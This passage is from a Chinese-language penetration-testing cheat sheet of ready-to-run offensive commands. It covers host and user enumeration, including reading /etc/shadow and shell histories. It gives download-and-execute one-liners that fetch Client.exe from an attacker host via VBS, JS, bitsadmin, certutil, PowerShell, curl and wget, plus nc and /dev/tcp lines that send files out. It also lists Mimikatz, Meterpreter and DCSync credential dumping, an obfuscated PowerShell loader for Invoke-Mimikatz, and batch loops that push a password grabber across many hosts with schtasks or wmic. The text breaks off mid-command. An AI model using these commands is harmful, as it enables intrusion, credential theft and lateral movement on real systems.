-antup\n&gt;netstat -antpx\n&gt;netstat -tulpn\n&gt;chkconfig --list\n&gt;chkconfig --list | grep 3:on\n&gt;last\n&gt;w\n用户信息\n&gt;id\n&gt;whomi\n&gt;w\n&gt;last\n&gt;cat /etc/passwd\n&gt;cat /etc/group\n&gt;cat /etc/shadow\n&gt;ls -alh /var/mail/\n&gt;grep -v -E &quot;^#&quot; /etc/passwd | awk -F: '$3 == 0 &#123; print $1&#125;'   # 列出超级用户\n&gt;awk -F: '($3 == &quot;0&quot;) &#123;print&#125;' /etc/passwd   #列出超级用户\n&gt;cat /etc/sudoers\n&gt;sudo –l\n操作记录\n&gt;cat ~/.bash_history\n&gt;cat ~/.nano_history\n&gt;cat ~/.atftp_history\n&gt;cat ~/.mysql_history\n&gt;cat ~/.php_history\n可写目录\n&gt;find / -writable -type d 2&gt;/dev/null      # 可写目录\n&gt;find / -perm -222 -type d 2&gt;/dev/null     # 可写目录 \n&gt;find / -perm -o w -type d 2&gt;/dev/null     # 可写目录\n&gt;find / -perm -o x -type d 2&gt;/dev/null     # 可执行目录\n&gt;find / \\( -perm -o w -perm -o x \\) -type d 2&gt;/dev/null   # 可写可执行目录\n</code></pre>\n<h2 id=\"http服务\"><a class=\"anchor\" href=\"#http服务\">#</a> HTTP 服务</h2>\n<pre><code>&gt;python2 -m SimpleHTTPServer \n&gt;python3 -m http.server 8080\n&gt;php -S 0.0.0.0:8888\n&gt;openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes\n&gt;openssl s_server -key key.pem -cert cert.pem -accept 443 –WWW\n&gt;ruby -rwebrick -e &quot;WEBrick::HTTPServer.new(:Port =&gt; 8888,:DocumentRoot =&gt; Dir.pwd).start&quot;\n&gt;ruby -run -e httpd . -p 8888\n</code></pre>\n<h2 id=\"文件操作-2\"><a class=\"anchor\" href=\"#文件操作-2\">#</a> 文件操作</h2>\n<h3 id=\"windows查找文件\"><a class=\"anchor\" href=\"#windows查找文件\">#</a> Windows 查找文件</h3>\n<pre><code>&gt;cd /d E: &amp;&amp; dir /b /s index.php\n&gt;for /r E:\\ %i in (index*.php) do @echo %i\n&gt;powershell Get-ChildItem d:\\ -Include index.php -recurse\n</code></pre>\n<h3 id=\"linux查找文件\"><a class=\"anchor\" href=\"#linux查找文件\">#</a> Linux 查找文件</h3>\n<pre><code>#find / -name index.php\n查找木马文件\n&gt;find . -name '*.php' | xargs grep -n 'eval('\n&gt;find . -name '*.php' | xargs grep -n 'assert('\n&gt;find . -name '*.php' | xargs grep -n 'system('\n</code></pre>\n<h3 id=\"创建\"><a class=\"anchor\" href=\"#创建\">#</a> 创建</h3>\n<pre><code>读文本文件：\n&gt;file = Get-Content &quot;1.txt&quot;\n&gt;file\n&gt;powershell Set-content &quot;1.txt&quot; &quot;wocao&quot;\n&amp;\n&gt;powershell &quot;write-output ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\\&quot;d2Vic2hlbGw=\\&quot;))) | out-file -filepath c:\\www\\wwwroot\\1.aspx;&quot;\n</code></pre>\n<h3 id=\"压缩\"><a class=\"anchor\" href=\"#压缩\">#</a> 压缩</h3>\n<pre><code>&gt;rar.exe a –k –r –s –m3 C:\\1.rar C:\\wwwroot\n&gt;7z.exe a –r –p12345 C:\\1.7z C:\\wwwroot\n</code></pre>\n<h3 id=\"解压\"><a class=\"anchor\" href=\"#解压\">#</a> 解压</h3>\n<pre><code>&gt;rar.exe e c:\\wwwroot\\1.rar\n&gt;7z.exe x –p12345 C:\\1.7z –oC:\\wwwroot\n</code></pre>\n<h3 id=\"传输\"><a class=\"anchor\" href=\"#传输\">#</a> 传输</h3>\n<h2 id=\"-430\"><a class=\"anchor\" href=\"#-430\">#</a> </h2>\n<h2 id=\"ftp\"><a class=\"anchor\" href=\"#ftp\">#</a> FTP</h2>\n<pre><code>&gt;open 192.168.0.98 21\n&gt;输入账号密码\n&gt;dir查看文件\n&gt;get file.txt\n</code></pre>\n<p><img data-src=\"311.png\" alt=\"\" /></p>\n<h2 id=\"-431\"><a class=\"anchor\" href=\"#-431\">#</a> </h2>\n<h2 id=\"vbs\"><a class=\"anchor\" href=\"#vbs\">#</a> VBS</h2>\n<pre><code>#1.vbs\n</code></pre>\n<figure class=\"highlight vb\"><figcaption data-lang=\"Visual Basic\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">Set</span> Post <span class=\"token operator\">=</span> CreateObject<span class=\"token punctuation\">(</span><span class=\"token string\">\"Msxml2.XMLHTTP\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">Set</span> Shell <span class=\"token operator\">=</span> CreateObject<span class=\"token punctuation\">(</span><span class=\"token string\">\"Wscript.Shell\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Post<span class=\"token punctuation\">.</span>Open <span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"http://192.168.1.192/Client.exe\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Post<span class=\"token punctuation\">.</span>Send<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">Set</span> aGet <span class=\"token operator\">=</span> CreateObject<span class=\"token punctuation\">(</span><span class=\"token string\">\"ADODB.Stream\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>aGet<span class=\"token punctuation\">.</span>Mode <span class=\"token operator\">=</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>aGet<span class=\"token punctuation\">.</span><span class=\"token keyword\">Type</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>aGet<span class=\"token punctuation\">.</span>Open<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>aGet<span class=\"token punctuation\">.</span>Write<span class=\"token punctuation\">(</span>Post<span class=\"token punctuation\">.</span>responseBody<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>aGet<span class=\"token punctuation\">.</span>SaveToFile <span class=\"token string\">\"C:\\1.exe\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span> </pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">></span>cscript <span class=\"token number\">1</span><span class=\"token punctuation\">.</span>vbs</pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">Const</span> adTypeBinary <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">Const</span> adSaveCreateOverWrite <span class=\"token operator\">=</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">Dim</span> http<span class=\"token punctuation\">,</span>ado</pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">Set</span> http <span class=\"token operator\">=</span> CreateObject<span class=\"token punctuation\">(</span><span class=\"token string\">\"Msxml2.serverXMLHTTP\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>http<span class=\"token punctuation\">.</span>SetOption <span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">13056</span><span class=\"token operator\">/</span><span class=\"token operator\">/</span>忽略HTTPS错误</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>http<span class=\"token punctuation\">.</span>open <span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"http://192.168.1.192/Client.exe\"</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>http<span class=\"token punctuation\">.</span>send</pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">Set</span> ado <span class=\"token operator\">=</span> createobject<span class=\"token punctuation\">(</span><span class=\"token string\">\"Adodb.Stream\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>ado<span class=\"token punctuation\">.</span><span class=\"token keyword\">Type</span> <span class=\"token operator\">=</span> adTypeBinary</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>ado<span class=\"token punctuation\">.</span>Open</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>ado<span class=\"token punctuation\">.</span>Write http<span class=\"token punctuation\">.</span>responseBody</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>ado<span class=\"token punctuation\">.</span>SaveToFile <span class=\"token string\">\"c:\\1.exe\"</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>ado<span class=\"token punctuation\">.</span>Close</pre></td></tr></table></figure><h2 id=\"-432\"><a class=\"anchor\" href=\"#-432\">#</a> </h2>\n<h2 id=\"js\"><a class=\"anchor\" href=\"#js\">#</a> JS</h2>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">var</span> WinHttpReq <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ActiveXObject</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"WinHttp.WinHttpRequest.5.1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>WinHttpReq<span class=\"token punctuation\">.</span><span class=\"token function\">Open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">,</span> WScript<span class=\"token punctuation\">.</span><span class=\"token function\">Arguments</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">/*async=*/</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>WinHttpReq<span class=\"token punctuation\">.</span><span class=\"token function\">Send</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>BinStream <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ActiveXObject</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ADODB.Stream\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>BinStream<span class=\"token punctuation\">.</span>Type <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> BinStream<span class=\"token punctuation\">.</span><span class=\"token function\">Open</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>BinStream<span class=\"token punctuation\">.</span><span class=\"token function\">Write</span><span class=\"token punctuation\">(</span>WinHttpReq<span class=\"token punctuation\">.</span>ResponseBody<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>BinStream<span class=\"token punctuation\">.</span><span class=\"token function\">SaveToFile</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"1.exe\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><pre><code>&gt;cscript /nologo 1.js http://192.168.1.192/Client.exe\n</code></pre>\n<p><img data-src=\"312.png\" alt=\"\" /></p>\n<h2 id=\"-433\"><a class=\"anchor\" href=\"#-433\">#</a> </h2>\n<h2 id=\"bitsadmin\"><a class=\"anchor\" href=\"#bitsadmin\">#</a> Bitsadmin</h2>\n<pre><code>&gt;bitsadmin /transfer n http://192.168.1.192/Client.exe  e:\\1.exe\n&gt;bitsadmin /rawreturn /transfer getfile http://192.168.1.192/Client.exe e:\\1.exe\n&gt;bitsadmin /rawreturn /transfer getpayload http://192.168.1.192/Client.exe e:\\1.exe\n&gt;bitsadmin /transfer myDownLoadJob /download /priority normal &quot;http://192.168.1.192/Client.exe&quot; &quot;e:\\1.exe &quot;\n</code></pre>\n<h2 id=\"-434\"><a class=\"anchor\" href=\"#-434\">#</a> </h2>\n<h2 id=\"powershell-3\"><a class=\"anchor\" href=\"#powershell-3\">#</a> Powershell</h2>\n<h2 id=\"-435\"><a class=\"anchor\" href=\"#-435\">#</a> </h2>\n<h3 id=\"1-3\"><a class=\"anchor\" href=\"#1-3\">#</a> 1</h3>\n<pre><code>注意：内核5.2以下版本可能无效\n&gt;powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.1.1/Client.exe','C:\\1.exe'); start-process 'c:\\1.exe'\n&gt;powershell \n&gt;(New-Object System.Net.WebClient).DownloadFile('http://192.168.0.108/1.exe',&quot;$env:APPDATA\\csrsv.exe&quot;);Start-Process(&quot;$env:APPDATA\\csrsv.exe&quot;)\n</code></pre>\n<h2 id=\"-436\"><a class=\"anchor\" href=\"#-436\">#</a> </h2>\n<h3 id=\"2-3\"><a class=\"anchor\" href=\"#2-3\">#</a> 2</h3>\n<pre><code>PS&gt;Copy-Item '\\\\sub2k8.zone.com\\c$\\windows\\1.txt' -Destination '\\\\dc.zone.com\\c$\\1.txt'\n</code></pre>\n<h2 id=\"-437\"><a class=\"anchor\" href=\"#-437\">#</a> </h2>\n<h3 id=\"3\"><a class=\"anchor\" href=\"#3\">#</a> 3</h3>\n<pre><code>&gt;powershell ($dpl=$env:temp+'f.exe');(New-Object System.Net.WebClient).DownloadFile('http://192.168.0.108/ok.txt',$dpl);\n</code></pre>\n<h2 id=\"-438\"><a class=\"anchor\" href=\"#-438\">#</a> </h2>\n<h3 id=\"4\"><a class=\"anchor\" href=\"#4\">#</a> 4</h3>\n<pre><code>高版本\nPS&gt;iwr -Uri http://192.168.0.106:1222/111.txt -OutFile 123.txt –UseBasicParsing\n</code></pre>\n<h2 id=\"-439\"><a class=\"anchor\" href=\"#-439\">#</a> </h2>\n<h3 id=\"5\"><a class=\"anchor\" href=\"#5\">#</a> 5</h3>\n<pre><code>C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Templates\n&gt;Import-Module BitsTransfer\n&gt;$path = [environment]::getfolderpath(&quot;temp&quot;)\n&gt;Start-BitsTransfer -Source &quot;http://192.168.0.108/ok.txt&quot; -Destination &quot;$path\\ok.txt&quot;\n&gt;Invoke-Item  &quot;$path\\ok.txt&quot;\n</code></pre>\n<h2 id=\"-440\"><a class=\"anchor\" href=\"#-440\">#</a> </h2>\n<h2 id=\"certutil\"><a class=\"anchor\" href=\"#certutil\">#</a> Certutil</h2>\n<pre><code>&gt;certutil.exe -urlcache -split -f http://192.168.1.192/Client.exe \n&gt;certutil.exe -urlcache -split -f http://192.168.1.192/Client.exe delete\n对文件进行编码下载后解码执行\n&gt;base64 payload.exe &gt; /var/www/html/1.txt # 在C&amp;C上生成经base64编码的exe\n&gt;certutril -urlcache -split -f http://192.168.0.107/1.txt &amp; certurl -decode 1.txt ms.exe &amp; ms.exe\n</code></pre>\n<h2 id=\"-441\"><a class=\"anchor\" href=\"#-441\">#</a> </h2>\n<h2 id=\"python-2\"><a class=\"anchor\" href=\"#python-2\">#</a> Python</h2>\n<pre><code>#python -c 'import urllib;urllib.urlretrieve(&quot;http://192.168.1.192/Client.exe&quot;,&quot;/path/to/save/1.exe&quot;)'\n</code></pre>\n<h2 id=\"-442\"><a class=\"anchor\" href=\"#-442\">#</a> </h2>\n<h2 id=\"perl-2\"><a class=\"anchor\" href=\"#perl-2\">#</a> Perl</h2>\n<pre><code>#!/usr/bin/perl \nuse LWP::Simple; \ngetstore(&quot;http://192.168.1.192/Client.exe&quot;, &quot;1.exe&quot;);\n</code></pre>\n<h2 id=\"-443\"><a class=\"anchor\" href=\"#-443\">#</a> </h2>\n<h2 id=\"php-2\"><a class=\"anchor\" href=\"#php-2\">#</a> PHP</h2>\n<pre><code>#!/usr/bin/php \n&lt;?php $data = @file(&quot;http://192.168.1.192/Client.exe&quot;);\n$lf = &quot;1.exe&quot;;         \n$fh = fopen($lf, 'w');         \nfwrite($fh, $data[0]);         \nfclose($fh); \n?&gt;\n</code></pre>\n<h2 id=\"-444\"><a class=\"anchor\" href=\"#-444\">#</a> </h2>\n<h2 id=\"curl\"><a class=\"anchor\" href=\"#curl\">#</a> Curl</h2>\n<pre><code>#curl -o 1.exe http://192.168.1.192/Client.exe\n</code></pre>\n<h2 id=\"-445\"><a class=\"anchor\" href=\"#-445\">#</a> </h2>\n<h2 id=\"wget\"><a class=\"anchor\" href=\"#wget\">#</a> wget</h2>\n<pre><code>#wget http://192.168.1.192/Client.exe\n#wget –b后台下载\n#wget –c 中断恢复\n</code></pre>\n<h2 id=\"-446\"><a class=\"anchor\" href=\"#-446\">#</a> </h2>\n<h2 id=\"nc-2\"><a class=\"anchor\" href=\"#nc-2\">#</a> nc</h2>\n<pre><code>&gt;nc –lvnp 333 &gt;1.txt\n目标机\n&gt;nc –vn 192.168.1.2 333 &lt;test.txt –q 1\n&amp;\n&gt;cat 1.txt &gt;/dev/tcp/1.1.1.1/333\n</code></pre>\n<h2 id=\"-447\"><a class=\"anchor\" href=\"#-447\">#</a> </h2>\n<h2 id=\"scp\"><a class=\"anchor\" href=\"#scp\">#</a> SCP</h2>\n<pre><code>Linux中传输文件\n&gt;scp -P 22 file.txt user@1.1.1.1:/tmp\n</code></pre>\n<h2 id=\"hash密码\"><a class=\"anchor\" href=\"#hash密码\">#</a> Hash &amp; 密码</h2>\n<h3 id=\"破解网址\"><a class=\"anchor\" href=\"#破解网址\">#</a> 破解网址</h3>\n<pre><code>https://www.objectif-securite.ch/en/ophcrack\nhttp://cracker.offensive-security.com/index.php\n</code></pre>\n<h3 id=\"googlecolab破解hash\"><a class=\"anchor\" href=\"#googlecolab破解hash\">#</a> GoogleColab 破解 hash</h3>\n<pre><code>之前在freebuf上看到过相关文章，最近在github上也看到了这个脚本，所以拿起来试试，速度可观\nhttps://www.freebuf.com/geek/195453.html\nhttps://gist.github.com/chvancooten/59acfbf1d8ee7a865108fca2e9d04c4a\n打开\nhttps://drive.google.com/drive\n新建一个文件夹，右键，更多选择google Colab\n</code></pre>\n<p><img data-src=\"667.png\" alt=\"\" /></p>\n<pre><code>如果没有，点关联更多应用，搜索这个名字，安装一下即可\n</code></pre>\n<p><img data-src=\"668.png\" alt=\"\" /><br />\n<img data-src=\"669.png\" alt=\"\" /></p>\n<pre><code>安装hashcat，下载字典\n</code></pre>\n<p><img data-src=\"670.png\" alt=\"\" /></p>\n<pre><code>运行类型选择GPU加速\n</code></pre>\n<p><img data-src=\"671.png\" alt=\"\" /><br />\n<img data-src=\"672.png\" alt=\"\" /></p>\n<pre><code>这里测试个简单密码\n</code></pre>\n<p><img data-src=\"673.png\" alt=\"\" /><br />\n<img data-src=\"674.png\" alt=\"\" /><br />\n<img data-src=\"675.png\" alt=\"\" /><br />\n<img data-src=\"676.png\" alt=\"\" /></p>\n<pre><code>12亿条密码大概20多分钟\nhttps://download.weakpass.com/wordlists/1851/hashesorg2019.gz\n以上是字典\n</code></pre>\n<p><img data-src=\"677.png\" alt=\"\" /></p>\n<h3 id=\"密码策略\"><a class=\"anchor\" href=\"#密码策略\">#</a> 密码策略</h3>\n<pre><code>默认情况，主机账号的口令每30天变更一次\n&gt;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Netlogon\\Parameters，键值为DisablePasswordChange，设置为1，即表示禁止修改账号口令\n&gt;组策略(gpedit.msc)中修改默认的30天，修改位置为&quot;Computer Configuration\\Windows Settings\\Security Settings\\Local Policies\\Security Options\\Domain member: Maximum machine account password age&quot;设置为0时，表示无限长\n&gt;禁止修改主机账号口令，用来支持VDI (virtual desktops)等类型的使用，具体位置为&quot;Computer Configuration\\Windows Settings\\Security Settings\\Local Policies\\Security Options\\Domain member: Disable machine account password changes&quot;\nDebug Privilege\n本地安全策略&gt;本地策略&gt;用户权限分配&gt;调试程序\n</code></pre>\n<h3 id=\"开启wdigest\"><a class=\"anchor\" href=\"#开启wdigest\">#</a> 开启 Wdigest</h3>\n<h2 id=\"-448\"><a class=\"anchor\" href=\"#-448\">#</a> </h2>\n<h2 id=\"cmd-2\"><a class=\"anchor\" href=\"#cmd-2\">#</a> Cmd</h2>\n<pre><code>&gt;reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\n</code></pre>\n<h2 id=\"-449\"><a class=\"anchor\" href=\"#-449\">#</a> </h2>\n<h2 id=\"powershell-4\"><a class=\"anchor\" href=\"#powershell-4\">#</a> powershell</h2>\n<pre><code>&gt;Set-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -Name UseLogonCredential -Type DWORD -Value 1\n</code></pre>\n<h2 id=\"-450\"><a class=\"anchor\" href=\"#-450\">#</a> </h2>\n<h2 id=\"meterpreter-2\"><a class=\"anchor\" href=\"#meterpreter-2\">#</a> meterpreter</h2>\n<pre><code>&gt;reg setval -k HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SecurityProviders\\\\WDigest -v UseLogonCredential -t REG_DWORD -d 1\n</code></pre>\n<h3 id=\"getpass\"><a class=\"anchor\" href=\"#getpass\">#</a> Getpass</h3>\n<pre><code>&gt;getpassword.exe&gt;1.txt\n</code></pre>\n<h3 id=\"quarkspwdump\"><a class=\"anchor\" href=\"#quarkspwdump\">#</a> QuarksPwDump</h3>\n<pre><code>&gt;QuarksPwDump.exe -dump-hash-local\n</code></pre>\n<h3 id=\"msf-5\"><a class=\"anchor\" href=\"#msf-5\">#</a> MSF</h3>\n<pre><code>Meterpreter &gt; run hashdump \n&amp;\nMeterpreter &gt; mimikatz_command -f samdump::hashes\n&amp;\nMeterpreter &gt; load mimikatz\nMeterpreter &gt; wdigest\n&amp;\nMeterpreter &gt; load mimikatz\nMeterpreter &gt; msv\nMeterpreter &gt; kerberos\n&amp;\nMeterpreter &gt; load kiwi\nMeterpreter &gt; creds_all\n&amp;\nMeterpreter &gt; migrate PID\nMeterpreter &gt; load mimikatz\nMeterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords\n&amp;\nMeterpreter &gt; run windows/gather/smart_hashdump\n</code></pre>\n<h3 id=\"empire-2\"><a class=\"anchor\" href=\"#empire-2\">#</a> Empire</h3>\n<pre><code>&gt;usemodule credentials/mimikatz/dcsync_hashdump\n</code></pre>\n<h3 id=\"invoke-dcsync\"><a class=\"anchor\" href=\"#invoke-dcsync\">#</a> Invoke-Dcsync</h3>\n<pre><code>&gt;powershell -nop -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/Invoke-DCSync.ps1');invoke-dcsync\n</code></pre>\n<p><img data-src=\"313.png\" alt=\"\" /></p>\n<h3 id=\"mimikatz\"><a class=\"anchor\" href=\"#mimikatz\">#</a> Mimikatz</h3>\n<h2 id=\"-451\"><a class=\"anchor\" href=\"#-451\">#</a> </h2>\n<h2 id=\"调用mimikatz远程抓取\"><a class=\"anchor\" href=\"#调用mimikatz远程抓取\">#</a> 调用 mimikatz 远程抓取</h2>\n<pre><code>抓明文\n&gt;powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.108/nishang/Gather/Invoke-Mimikatz.ps1'); Invoke-Mimikatz\n抓hash\n&gt;powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.100/nishang/Gather/Get-PassHashes.ps1');Get-PassHashes\n&gt;powershell -w hidden -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/powersploit/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz&quot; &gt;C:\\Users\\Administrator.DC\\Desktop\\1123.txt\n</code></pre>\n<h2 id=\"-452\"><a class=\"anchor\" href=\"#-452\">#</a> </h2>\n<h2 id=\"横向批量抓hash\"><a class=\"anchor\" href=\"#横向批量抓hash\">#</a> 横向批量抓 hash</h2>\n<h2 id=\"-453\"><a class=\"anchor\" href=\"#-453\">#</a> </h2>\n<h3 id=\"schtasks\"><a class=\"anchor\" href=\"#schtasks\">#</a> Schtasks</h3>\n<pre><code>把IP列表放入ip.txt文件中，通过一个账户密码批量net use与列表里的IP建立连接，如果建立连接没出错的话，复制getpass到目录temp目录，使用账户密码远程创建计划任务名字为windowsupdate，指定每日00：00以system权限执行getpass文件，创建完计划任务后，/tn是立刻执行此计划任务，执行完后删除此计划任务，ping -n 10&gt;nul是程序停留，相当于延时10秒，之后复制文件到本地，接着删除getpass文件，删除创建的连接。\n&gt;for /f %i in (ip.txt) do net use \\\\%i\\admin$ /user:&quot;administrator&quot; &quot;password&quot; &amp; if %errorlevel% equ 0 ( copy getpass.exe \\\\%i\\admin$\\temp\\ /Y ) &amp; schtasks /create /s &quot;%i&quot; /u &quot;administrator&quot; /p &quot;password&quot; /RL HIGHEST /F /tn &quot;windowsupdate&quot; /tr &quot;c:\\windows\\temp\\getpass.exe&quot; /sc DAILY /mo 1 /ST 00:00 /RU SYSTEM &amp; schtasks /run /tn windowsupdate /s &quot;%i&quot; /U &quot;administrator&quot; /P &quot;password&quot; &amp; schtasks /delete /F /tn windowsupdate /s &quot;%i&quot; /U &quot; administrator&quot; /P &quot;password&quot; &amp; @ping 127.0.0.1 -n 10 &gt;nul &amp; move \\\\%i\\admin$\\temp\\dumps.logs C:\\Users\\Public\\%i.logs &amp; del \\\\%i\\admin$\\debug\\getpass.exe /F &amp; net use \\\\%i\\admin$ /del\n</code></pre>\n<h2 id=\"-454\"><a class=\"anchor\" href=\"#-454\">#</a> </h2>\n<h3 id=\"wmic-2\"><a class=\"anchor\" href=\"#wmic-2\">#</a> Wmic</h3>\n<pre><code>&gt;for /f %i in (ip.txt) do net use \\\\%i\\admin$ /user:&quot;administrator&quot; &quot;password&quot; &amp; if %errorlevel% equ 0 ( copy getpass.exe \\\\%i\\admin$\\temp\\ /Y ) &amp; wmic /NODE:&quot;%i&quot; /user:&quot;administrator&quot; /password:&quot;password&quot; PROCESS call create &quot;c:\\windows\\temp\\getpass.exe&quot; &amp; @ping 127.0.0.1 -n 10 &gt;nul &amp; move \\\\%i\\admin$\\temp\\dumps.logs C:\\Users\\Public\\%i.logs &amp; del \\\\%i\\admin$\\temp\\getpass.exe /F &amp; net use \\\\%i\\admin$ /del\n</code></pre>\n<h2 id=\"-455\"><a class=\"anchor\" href=\"#-455\">#</a> </h2>\n<h2 id=\"直接使用\"><a class=\"anchor\" href=\"#直接使用\">#</a> 直接使用</h2>\n<pre><code>&gt;mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit &gt;&gt; log.txt \n&gt;privilege::debug\n&gt;misc::memssp\n锁屏\n&gt;rundll32.exe user32.dll,LockWorkStation\n记录的结果在c:\\windows\\system32\\mimilsa.log\n&gt;mimikatz log &quot;privilege::debug&quot; &quot;lsadump::lsa /patch&quot;\n&gt;mimikatz !privilege::debug \n&gt;mimikatz !token::elevate \n&gt;mimikatz !lsadump::sam\n</code></pre>\n<h2 id=\"-456\"><a class=\"anchor\" href=\"#-456\">#</a> </h2>\n<h2 id=\"powershell-bypass\"><a class=\"anchor\" href=\"#powershell-bypass\">#</a> Powershell Bypass</h2>\n<pre><code>&gt;powershell -c &quot; ('IEX '+'(Ne'+'w-O'+'bject Ne'+'t.W'+'ebClien'+'t).Do'+'wnloadS'+'trin'+'g'+'('+'1vchttp://'+'192.168.0'+'.101/'+'Inv'+'oke-Mimik'+'a'+'tz.'+'ps11v'+'c)'+';'+'I'+'nvoke-Mimika'+'tz').REplaCE('1vc',[STRing][CHAR]39)|IeX&quot;\n</code></pre>\n<h2 id=\"-457\"><a class=\"anchor\" href=\"#-457\">#</a> </h2>\n<h2 id=\"net-20\"><a class=\"anchor\" href=\"#net-20\">#</a> .net 2.0</h2>\n<pre><code>katz.cs放置C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\nPowershell执行\n&gt;$key = 